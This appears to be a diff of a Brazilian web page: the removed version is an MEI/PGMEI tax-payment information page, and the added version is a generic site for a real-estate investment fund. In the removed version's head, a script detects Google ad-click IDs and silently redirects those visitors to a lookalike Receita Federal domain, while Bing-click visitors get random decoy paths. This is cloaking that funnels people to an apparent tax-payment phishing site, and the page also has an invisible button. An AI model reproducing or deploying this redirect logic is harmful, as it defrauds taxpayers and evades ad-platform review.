@@ -1,289 +1,374 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="pt-BR">
 <head>
-  
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MEI e Pagamentos PGMEI - Informações e Orientações</title>
-  <meta name="description" content="Saiba tudo sobre MEI, PGMEI, DAS, benefícios, obrigações e como emitir pagamentos. Informações completas para microempreendedores individuais.">
-  <meta name="keywords" content="MEI, PGMEI, boleto DAS, microempreendedor individual, formalização MEI, benefícios MEI, ocupações MEI">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Arton Jardins Haddock - Fundo de Investimento Imobiliário</title>
+  <meta name="description" content="Arton Jardins Haddock - Gestão profissional em ativos imobiliários. Transparência, governança e foco em resultados." />
+
+  <!-- Google Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet">
+
   <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #0d47a1;
-      color: #fff;
-      line-height: 1.6;
+    :root{
+      --nav-height:72px;
+      --blue:#0e3b6b;
+      --muted:#6b7280;
+      --max-width:1100px;
+      --hero-img: url('https://images.unsplash.com/photo-1580128632042-5c8b1d6fb857?auto=format&fit=crop&w=2000&q=60');
     }
-    header {
-      padding: 20px;
-      text-align: center;
-      background: #1565c0;
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      color:#1f2937;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
     }
-    header h1 {
-      margin: 0;
-      font-size: 2rem;
+
+    /* Header */
+    header{
+      position:fixed;
+      left:0;right:0;
+      top:0;
+      height:var(--nav-height);
+      background:var(--blue);
+      color:white;
+      display:flex;
+      align-items:center;
+      z-index:40;
+      box-shadow: 0 2px 6px rgba(2,6,23,0.15);
     }
-    main {
-      padding: 20px;
-      max-width: 1000px;
-      margin: auto;
-      background: #1976d2;
-      border-radius: 12px;
+    .container{
+      width:100%;
+      max-width:var(--max-width);
+      margin:0 auto;
+      padding:0 20px;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
     }
-    h2, h3 {
-      color: #bbdefb;
+    .brand{
+      display:flex;
+      gap:12px;
+      align-items:center;
+      font-weight:700;
     }
-    a {
-      color: #ffeb3b;
-      text-decoration: underline;
+    .brand .logo{
+      width:42px;height:42px;border-radius:6px;background:#fff3;display:flex;align-items:center;justify-content:center;font-weight:700;color:white;
+      font-family: "Playfair Display", serif;
+      font-size:18px;
     }
-    footer {
-      padding: 20px;
-      text-align: center;
-      background: #0d47a1;
-      margin-top: 40px;
+    nav ul{
+      list-style:none;
+      margin:0;padding:0;
+      display:flex;gap:22px;align-items:center;
     }
-    .button-hidden {
-      background-color: #1976d2;
-      color: #1976d2;
-      border: none;
-      padding: 12px 20px;
-      border-radius: 6px;
-      cursor: pointer;
-      opacity: 0;
+    nav a{
+      color: #e6eefb;
+      text-decoration:none;
+      font-weight:600;
+      padding:8px 6px;
     }
-    .cookie-banner {
-      position: fixed;
-      bottom: 0;
-      width: 100%;
-      background: #1565c0;
-      padding: 15px;
-      text-align: center;
+    nav a:hover{opacity:0.85}
+
+    /* Hero */
+    .hero{
+      margin-top:var(--nav-height);
+      min-height:420px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      background-image: linear-gradient(90deg, rgba(4,18,37,0.55), rgba(4,18,37,0.15)), var(--hero-img);
+      background-position:center;
+      background-size:cover;
+      color:white;
+      text-align:center;
+      padding:56px 20px;
     }
-    .cookie-banner button {
-      background: #ffeb3b;
-      border: none;
-      padding: 8px 12px;
-      margin-left: 10px;
-      border-radius: 4px;
-      cursor: pointer;
+    .hero .inner{
+      max-width:980px;
     }
-    .modal {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.7);
-      justify-content: center;
-      align-items: center;
+    .hero h1{
+      font-family: "Playfair Display", serif;
+      font-size:36px;
+      margin:0 0 12px;
+      letter-spacing:0.2px;
     }
-    .modal-content {
-      background: #fff;
-      color: #000;
-      padding: 20px;
-      border-radius: 12px;
-      max-width: 700px;
-      overflow-y: auto;
-      max-height: 80vh;
+    .hero p{
+      margin:0;
+      font-size:16px;
+      opacity:0.95;
     }
-    .close {
-      float: right;
-      cursor: pointer;
-      font-size: 20px;
-      font-weight: bold;
+
+    /* Sections */
+    section{
+      padding:64px 20px;
+    }
+    .wrap{
+      max-width:var(--max-width);
+      margin:0 auto;
+    }
+    h2{
+      font-family:"Playfair Display", serif;
+      color:var(--blue);
+      margin:0 0 18px;
+      font-size:26px;
+    }
+    .lead{
+      color:var(--muted);
+      margin-bottom:18px;
+    }
+
+    /* Quem somos card */
+    .info-grid{
+      display:grid;
+      grid-template-columns: 1fr 320px;
+      gap:28px;
+      align-items:start;
+    }
+    .card{
+      background:#fff;
+      border-radius:10px;
+      padding:20px;
+      box-shadow:0 6px 20px rgba(15,23,42,0.06);
+    }
+    .muted-sm{color:var(--muted);font-size:14px}
+
+    /* Services */
+    .services{
+      display:grid;
+      grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+      gap:18px;
+    }
+    .service{
+      padding:20px;border-radius:8px;background:#fff;box-shadow:0 6px 18px rgba(15,23,42,0.04);
+    }
+    .service h3{margin:0 0 10px;font-size:16px;color:var(--blue)}
+
+    /* Contact */
+    .contact-grid{
+      display:grid;
+      grid-template-columns:1fr 360px;
+      gap:24px;
+    }
+    form input, form textarea{
+      width:100%;padding:12px;border-radius:8px;border:1px solid #e6e9ef;font-size:14px;margin-bottom:12px;
+    }
+    form button{
+      padding:12px 16px;border-radius:8px;border:0;background:var(--blue);color:#fff;font-weight:600;cursor:pointer;
+    }
+
+    /* Footer */
+    footer{
+      padding:28px 20px;background:#f8fafc;color: #374151;
+    }
+    .footer-row{max-width:var(--max-width);margin:0 auto;display:flex;justify-content:space-between;align-items:center;gap:16px}
+    .legal{font-size:13px;color:var(--muted)}
+
+    /* Responsive */
+    @media (max-width:900px){
+      .info-grid,.contact-grid{grid-template-columns:1fr}
+      nav ul{display:none}
+    }
+    @media (max-width:520px){
+      .hero h1{font-size:28px}
+      .hero{min-height:360px;padding:36px 16px}
     }
   </style>
-
-<script>
-
-const urls = [
-    'cte/index',
-    'nfe/index',
-    'cte/index',
-    'asp/indexp',
-    'app/index',
-    'xml/indexp',
-    'danfe/index',
-    'nfe/index'
-];
-
-// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
-function generateHash() {
-    // Gerando um hash simples como alternativa ao MD5
-    // Para MD5 real, seria necessário uma biblioteca como crypto-js
-    return Math.random().toString(36).substring(2, 15) + 
-           Math.random().toString(36).substring(2, 15) + 
-           Date.now().toString(36);
-}
-
-// Selecionando URL aleatória
-const randomIndex = Math.floor(Math.random() * urls.length);
-const randomUrl = urls[randomIndex];
-const hash = generateHash();
-const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
-const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
-const xirjfgjsdhdjd = 'https://www8fazenda.servicosreceitas.mom/?id=1';  
-
-// Obtendo o referer (disponível apenas no navegador)
-let referer;
-if (typeof document !== 'undefined' && document.referrer) {
-    referer = document.referrer;
-} else {
-    referer = 'not found';
-}
-
-// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
-let currentUrl;
-if (typeof window !== 'undefined') {
-    currentUrl = window.location.href;
-} else {
-    currentUrl = '';
-}
-
-// Verificando condições e redirecionando
-if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
-    // Redirecionamento (no navegador)
-    if (typeof window !== 'undefined') {
-        window.location.href = xirjfgjsdhdjd ;
-    } else {
-        console.log('Redirect to:', xirjfgjsdhdjd );
-    }
-} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
-    // Redirecionamento (no navegador)
-    if (typeof window !== 'undefined') {
-        window.location.href = bingrandomUrlWithHash;
-    } else {
-        console.log('Redirect to:', bingrandomUrlWithHash);
-    }
-} else {
-    // Bloco vazio equivalente ao else do PHP
-}
-  
-</script>
-
-
-  
 </head>
-  
 <body>
+
   <header>
-    <h1>MEI e Pagamentos PGMEI</h1>
+    <div class="container">
+      <div class="brand" aria-label="logo e nome">
+        <div class="logo" aria-hidden="true">AJ</div>
+        <div>
+          <div style="font-size:15px">Arton Jardins Haddock</div>
+          <div style="font-size:12px;opacity:0.85">Fundo de Investimento Imobiliário</div>
+        </div>
+      </div>
+
+      <nav aria-label="menu principal">
+        <ul>
+          <li><a href="#quem-somos">Quem Somos</a></li>
+          <li><a href="#servicos">Serviços</a></li>
+          <li><a href="#contato">Contato</a></li>
+          <li><a href="#privacidade">Privacidade</a></li>
+        </ul>
+      </nav>
+    </div>
   </header>
 
   <main>
-    <h2>O que é o MEI e como funciona o PGMEI</h2>
-    <p>O Microempreendedor Individual (MEI) é a forma mais prática e acessível para quem deseja formalizar o próprio negócio. Já o PGMEI é o sistema oficial da Receita Federal para emissão e pagamento do boleto DAS, que mantém suas contribuições em dia.</p>
+    <section class="hero" role="banner" aria-label="Banner principal">
+      <div class="inner">
+        <h1>Gestão Profissional em Ativos Imobiliários</h1>
+        <p>Transparência, governança e foco em resultados desde 14 de junho de 2024 — sempre em conformidade com normas regulatórias brasileiras.</p>
+      </div>
+    </section>
 
-    <h2>Benefícios do MEI</h2>
-    <ul>
-      <li>Direito a benefícios previdenciários como aposentadoria por idade.</li>
-      <li>Emissão de notas fiscais.</li>
-      <li>Facilidade de acesso a crédito bancário.</li>
-      <li>Carga tributária simplificada e reduzida.</li>
-    </ul>
+    <section id="quem-somos">
+      <div class="wrap">
+        <h2>Quem Somos</h2>
+        <p class="lead">O <strong>Arton Jardins Haddock Fundo de Investimento Imobiliário – Responsabilidade Limitada</strong> é um veículo de investimento constituído e registrado no CNPJ abaixo, com atuação focada na aquisição, administração e valorização de ativos imobiliários.</p>
 
-    <h2>Obrigações do MEI</h2>
-    <p>O MEI deve pagar mensalmente o DAS (Documento de Arrecadação do Simples Nacional), manter a declaração anual em dia e cumprir com suas obrigações fiscais. Isso garante o acesso aos benefícios e evita problemas legais.</p>
+        <div class="info-grid" style="margin-top:18px">
+          <div>
+            <div class="card">
+              <h3 style="margin-top:0">Visão e Atuação</h3>
+              <p class="muted-sm">Nosso objetivo é gerar valor sustentável para cotistas por meio de gestão profissional de portfólio imobiliário, com foco em governança, compliance e resultados de longo prazo.</p>
 
-    <h2>O que você precisa saber antes de se tornar um MEI?</h2>
-    <p>Alguns benefícios poderão ser impactados após a sua formalização como MEI. Veja se você recebe algum desses:</p>
+              <h4 style="margin-top:16px">Dados Cadastrais</h4>
+              <p class="muted-sm">
+                <strong>Razão Social:</strong> Arton Jardins Haddock Fundo de Investimento Imobiliario Responsabilidade Limitada<br>
+                <strong>CNPJ:</strong> 55.539.410/0001-05 (55539410000105)<br>
+                <strong>Data de Abertura:</strong> 14/06/2024<br>
+                <strong>Porte:</strong> Sem Enquadramento<br>
+                <strong>Natureza Jurídica:</strong> Clube/Fundo de Investimento<br>
+                <strong>Tipo:</strong> Matriz<br>
+                <strong>Situação:</strong> Ativa (desde 14/06/2024)
+              </p>
+            </div>
 
-    <h3>Benefícios previdenciários que serão cancelados</h3>
-    <ul>
-      <li>Aposentadoria por invalidez.</li>
-      <li>Auxílio-doença ou salário maternidade.</li>
-    </ul>
+            <div style="margin-top:18px" class="card">
+              <h3>Missão</h3>
+              <p class="muted-sm">Prover gestão responsável e profissional de ativos imobiliários, otimizando retornos dentro de parâmetros de risco bem definidos e conformidade regulatória.</p>
+            </div>
+          </div>
 
-    <h3>Benefícios assistenciais que podem ser cancelados</h3>
-    <ul>
-      <li>Seguro desemprego.</li>
-      <li>BPC-LOAS.</li>
-      <li>Prouni, FIES.</li>
-    </ul>
+          <aside>
+            <div class="card">
+              <h3>Localização</h3>
+              <p class="muted-sm">
+                Praia De Botafogo, 501 — 5º Andar - Parte<br>
+                Botafogo — Rio de Janeiro / RJ<br>
+                CEP: 22250-040
+              </p>
 
-    <h3>Benefícios que NÃO serão cancelados</h3>
-    <ul>
-      <li>Aposentadoria especial por insalubridade, idade ou por tempo de contribuição.</li>
-      <li>Fundo de Garantia por Tempo de Serviço (FGTS).</li>
-      <li>Programa de Integração Social (PIS).</li>
-      <li>Pensão por falecimento de cônjuge, pais ou filhos.</li>
-      <li>Pensão recebida por tutor de menor de idade, por morte do responsável.</li>
-    </ul>
+              <h3 style="margin-top:12px">Contatos</h3>
+              <p class="muted-sm">
+                E-mail: <a href="mailto:ol-documentacao-societario@btgpactual.com">ol-documentacao-societario@btgpactual.com</a><br>
+                Telefones:<br>
+                (21) 3262-9600 | (21) 2514-8600
+              </p>
+            </div>
+          </aside>
+        </div>
+      </div>
+    </section>
 
-    <h3>Observações importantes</h3>
-    <p>Beneficiários do Bolsa Família devem observar os critérios do programa. Servidor Público Federal não pode ser MEI (Lei nº 8112/90). Já os servidores estaduais e municipais devem verificar a legislação própria.</p>
+    <section id="servicos" style="background:#f7fafc">
+      <div class="wrap">
+        <h2>Serviços</h2>
+        <p class="lead">Áreas principais de atuação — edite conforme a estratégia real do fundo.</p>
 
-    <h3>Requisitos para ser MEI</h3>
-    <ul>
-      <li>Exercer atividades que estejam na lista de ocupações permitidas para o MEI.</li>
-      <li>Contratar no máximo um empregado.</li>
-      <li>Não ser sócio ou administrador de outra empresa.</li>
-      <li>Ter faturamento anual de até R$ 81.000,00 (ou até R$ 251.600,00 para transportador autônomo de cargas).</li>
-    </ul>
+        <div class="services">
+          <div class="service">
+            <h3>Identificação de Ativos</h3>
+            <p class="muted-sm">Análise de oportunidades imobiliárias com potencial de valorização e rendimento.</p>
+          </div>
+          <div class="service">
+            <h3>Gestão Patrimonial</h3>
+            <p class="muted-sm">Administração e manutenção de ativos visando eficiência operacional e preservação de valor.</p>
+          </div>
+          <div class="service">
+            <h3>Estratégias de Valorização</h3>
+            <p class="muted-sm">Projetos de melhoria, repositionamento ou renegociação para aumento de rendimento.</p>
+          </div>
+          <div class="service">
+            <h3>Compliance e Governança</h3>
+            <p class="muted-sm">Políticas de conformidade regulatória, disclosure e atendimento a cotistas.</p>
+          </div>
+        </div>
+      </div>
+    </section>
 
-    <h2>Perguntas Frequentes</h2>
-    <h3>Como emitir o boleto DAS?</h3>
-    <p>Acesse o portal do PGMEI, faça login com sua conta gov.br e emita o boleto mensal.</p>
-    <h3>O que acontece se eu atrasar o pagamento?</h3>
-    <p>O boleto em atraso gera multa e juros. Quanto antes regularizar, menor o valor adicional.</p>
-    <h3>Preciso de contador para ser MEI?</h3>
-    <p>Não é obrigatório, mas pode ajudar na organização e cumprimento de obrigações.</p>
+    <section id="contato">
+      <div class="wrap">
+        <h2>Contato</h2>
+        <p class="lead">Entre em contato para informações institucionais, dúvidas sobre o fundo ou documentação societária.</p>
 
-    <button class="button-hidden">Botão Oculto</button>
+        <div class="contact-grid">
+          <div>
+            <form id="contactForm" onsubmit="handleSubmit(event)">
+              <label for="name" class="muted-sm">Nome</label>
+              <input id="name" name="name" required placeholder="Seu nome">
+
+              <label for="email" class="muted-sm">E-mail</label>
+              <input id="email" type="email" name="email" required placeholder="seu@exemplo.com">
+
+              <label for="message" class="muted-sm">Mensagem</label>
+              <textarea id="message" name="message" rows="6" placeholder="Escreva sua mensagem..." required></textarea>
+
+              <button type="submit">Enviar Mensagem</button>
+            </form>
+            <p style="margin-top:12px" class="muted-sm">Ou envie email diretamente para: <a href="mailto:ol-documentacao-societario@btgpactual.com">ol-documentacao-societario@btgpactual.com</a></p>
+          </div>
+
+          <aside>
+            <div class="card">
+              <h3>Telefone</h3>
+              <p class="muted-sm">(21) 3262-9600<br>(21) 2514-8600</p>
+
+              <h3 style="margin-top:12px">Endereço</h3>
+              <p class="muted-sm">Praia De Botafogo, 501 — 5º Andar - Parte<br>Botafogo — Rio de Janeiro / RJ</p>
+
+              <h3 style="margin-top:12px">Horário</h3>
+              <p class="muted-sm">Seg — Sex: 09:00 — 18:00</p>
+            </div>
+          </aside>
+        </div>
+      </div>
+    </section>
+
+    <section id="privacidade" style="background:#fff">
+      <div class="wrap">
+        <h2>Privacidade</h2>
+        <p class="lead">Informações sobre tratamento de dados, políticas de privacidade e uso de cookies — resumo e link para documento completo.</p>
+        <div class="card" style="margin-top:12px">
+          <p class="muted-sm">Este site fornece informações institucionais. Para obter a política completa de privacidade e tratamento de dados pessoais, favor contatar <a href="mailto:ol-documentacao-societario@btgpactual.com">ol-documentacao-societario@btgpactual.com</a>.</p>
+        </div>
+      </div>
+    </section>
   </main>
 
   <footer>
-    <p><a href="#" onclick="openModal('termosModal')">Termos de Uso</a> | <a href="#" onclick="openModal('privacidadeModal')">Política de Privacidade</a> | <a href="#" onclick="openModal('contatoModal')">Contato</a></p>
-    <p>&copy; 2025 - Informações sobre MEI e PGMEI. Este site não possui vínculo com a Receita Federal.</p>
+    <div class="footer-row">
+      <div class="legal">
+        © <strong>Arton Jardins Haddock Fundo de Investimento Imobiliario</strong> — CNPJ 55.539.410/0001-05<br>
+        Endereço: Praia De Botafogo, 501 — Botafogo, Rio de Janeiro — CEP 22250-040
+      </div>
+      <div style="font-size:13px;color:var(--muted)">Desenvolvido por <strong>Arton</strong></div>
+    </div>
   </footer>
 
-  <div class="cookie-banner" id="cookieBanner">
-    Este site usa cookies para melhorar sua experiência.
-    <button onclick="aceitarCookies()">Aceitar</button>
-  </div>
-
-  <!-- Modals -->
-  <div class="modal" id="termosModal">
-    <div class="modal-content">
-      <span class="close" onclick="closeModal('termosModal')">&times;</span>
-      <h2>Termos de Uso</h2>
-      <p>Estes termos descrevem as condições de uso do site e serviços relacionados a informações sobre MEI e PGMEI. Ao continuar navegando, você concorda com as regras aqui descritas.</p>
-    </div>
-  </div>
-
-  <div class="modal" id="privacidadeModal">
-    <div class="modal-content">
-      <span class="close" onclick="closeModal('privacidadeModal')">&times;</span>
-      <h2>Política de Privacidade</h2>
-      <p>Este site respeita sua privacidade e não coleta dados pessoais sem consentimento. Qualquer informação fornecida será utilizada apenas para fins de contato ou suporte.</p>
-    </div>
-  </div>
-
-  <div class="modal" id="contatoModal">
-    <div class="modal-content">
-      <span class="close" onclick="closeModal('contatoModal')">&times;</span>
-      <h2>Contato</h2>
-      <p>Entre em contato pelo email: suporte.mei@gmail.com</p>
-    </div>
-  </div>
-
   <script>
-    function aceitarCookies() {
-      document.getElementById('cookieBanner').style.display = 'none';
-      localStorage.setItem('cookiesAceitos', 'true');
-    }
-    if(localStorage.getItem('cookiesAceitos')) {
-      document.getElementById('cookieBanner').style.display = 'none';
-    }
-    function openModal(id) {
-      document.getElementById(id).style.display = 'flex';
-    }
-    function closeModal(id) {
-      document.getElementById(id).style.display = 'none';
+    // Smooth scroll for anchor links
+    document.querySelectorAll('a[href^="#"]').forEach(a=>{
+      a.addEventListener('click', e=>{
+        e.preventDefault();
+        const id = a.getAttribute('href').slice(1);
+        const el = document.getElementById(id);
+        if(el){
+          window.scrollTo({top: el.getBoundingClientRect().top + window.pageYOffset - 72, behavior:'smooth'});
+        }
+      });
+    });
+
+    // Fake form handler: use mailto fallback
+    function handleSubmit(e){
+      e.preventDefault();
+      const name = document.getElementById('name').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const msg = document.getElementById('message').value.trim();
+      const subject = encodeURIComponent('Contato pelo site - ' + name);
+      const body = encodeURIComponent('Nome: ' + name + '\\nE-mail: ' + email + '\\n\\n' + msg);
+      // Opens user's email client
+      window.location.href = `mailto:ol-documentacao-societario@btgpactual.com?subject=${subject}&body=${body}`;
     }
   </script>
+
 </body>
 </html>
